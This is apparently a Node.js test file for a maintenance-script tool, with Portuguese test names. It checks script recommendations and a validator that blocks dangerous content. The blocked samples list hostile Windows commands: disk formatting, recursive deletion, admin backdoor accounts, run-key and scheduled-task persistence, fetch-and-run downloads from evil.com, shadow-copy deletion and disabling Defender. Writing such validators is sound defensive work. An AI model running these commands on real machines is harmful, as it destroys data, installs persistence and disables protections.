import test from "node:test";
import assert from "node:assert/strict";

import {
  assertScriptContentIsSafe,
  recommendMaintenanceScripts,
  scoreMaintenanceScriptForContext
} from "./maintenanceScriptRepository.js";

test("pontua script recomendado pelo contexto do aviso", () => {
  const score = scoreMaintenanceScriptForContext(
    {
      id: "script-disk",
      name: "Verificacao de disco",
      active: true,
      tags: ["disco", "armazenamento"],
      relatedAlertTypes: ["disk_usage"],
      relatedProblemTypes: ["Disco acima do limite"],
      recommendedForCategories: ["hardware"]
    },
    {
      alertType: "disk_usage",
      problemType: "Disco acima do limite",
      category: "hardware",
      title: "Disco acima do limite em SRV-DB-01"
    }
  );

  assert.ok(score);
  assert.equal(score.isRecommended, true);
  assert.ok(score.recommendationScore > 0);
});

test("separa recomendados e outros sem incluir scripts inativos", () => {
  const result = recommendMaintenanceScripts(
    {
      alertType: "ping_failure",
      problemType: "Maquina offline",
      title: "Maquina offline em WS-FIN-07"
    },
    [
      {
        id: "network",
        name: "Diagnostico de rede",
        active: true,
        tags: ["rede", "offline"],
        relatedAlertTypes: ["ping_failure"]
      },
      {
        id: "inventory",
        name: "Coleta de inventario",
        active: true,
        tags: ["inventario"]
      },
      {
        id: "inactive",
        name: "Script inativo",
        active: false,
        tags: ["offline"]
      }
    ]
  );

  assert.deepEqual(result.recommended.map((script) => script.id), ["network"]);
  assert.deepEqual(result.others.map((script) => script.id), ["inventory"]);
});

const dangerousContentSamples = [
  ["format c:", "formatar unidade"],
  ["diskpart /s script.txt", "particionamento"],
  ["cipher /w:C:\\", "apagamento seguro"],
  ["del /s /q c:\\windows\\temp", "exclusao recursiva"],
  ["rd /s /q c:\\temp", "remocao recursiva"],
  ["net user hacker Senha123! /add", "criacao de usuario"],
  ["net localgroup administrators hacker /add", "grupo administradores"],
  ["reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x", "persistencia"],
  ["schtasks /create /tn Backdoor /tr evil.exe /sc onstart", "tarefa agendada"],
  ["Invoke-WebRequest -Uri http://evil.com/a.exe -OutFile a.exe\nStart-Process a.exe", "download seguido de execucao"],
  ["curl http://evil.com/payload.exe -o payload.exe", "download de executavel"],
  ["wget http://evil.com/payload.exe -O payload.exe", "download de executavel"],
  ["certutil -urlcache -split -f http://evil.com/a.exe a.exe", "certutil"],
  ["vssadmin delete shadows /all /quiet", "copias de sombra"],
  ["bcdedit /set {default} recoveryenabled no", "configuracao de boot"],
  ["takeown /f C:\\Windows\\System32 /r", "permissoes em diretorio do sistema"],
  ["icacls C:\\Windows\\System32 /grant Everyone:F", "permissoes em diretorio do sistema"],
  ["taskkill /f /im MsMpEng.exe", "antivirus"],
  ["sc stop WinDefend\ntaskkill /f /im avp.exe", "antivirus"],
  ["Set-MpPreference -DisableIOAVProtection $true", "Windows Defender"],
  ["Invoke-CustomCommand -DisableRealtimeMonitoring $true", "protecao em tempo real"]
];

for (const [content, expectedReasonFragment] of dangerousContentSamples) {
  test(`assertScriptContentIsSafe bloqueia conteudo perigoso: ${content.split("\n")[0]}`, () => {
    assert.throws(
      () => assertScriptContentIsSafe(content),
      (error) => {
        assert.match(error.message, /Conteudo do script bloqueado/);
        assert.match(error.message.toLowerCase(), new RegExp(expectedReasonFragment.toLowerCase()));
        return true;
      }
    );
  });
}

const safeContentSamples = [
  "ipconfig /all",
  "net stop spooler",
  "sc stop WinDefend",
  "Get-NetIPConfiguration",
  "Get-Service | Where-Object { $_.Status -eq 'Stopped' }",
  "Get-PSDrive C | Select-Object Used, Free",
  "ipconfig /flushdns\nipconfig /renew",
  "Restart-Service -Name Spooler -Force",
  "Get-CimInstance Win32_LogicalDisk | Select-Object DeviceID, FreeSpace"
];

for (const content of safeContentSamples) {
  test(`assertScriptContentIsSafe permite conteudo seguro: ${content.split("\n")[0]}`, () => {
    assert.doesNotThrow(() => assertScriptContentIsSafe(content));
  });
}

test("assertScriptContentIsSafe trata conteudo vazio como seguro (validacao de vazio e feita em outro ponto)", () => {
  assert.doesNotThrow(() => assertScriptContentIsSafe(""));
  assert.doesNotThrow(() => assertScriptContentIsSafe(null));
  assert.doesNotThrow(() => assertScriptContentIsSafe(undefined));
});
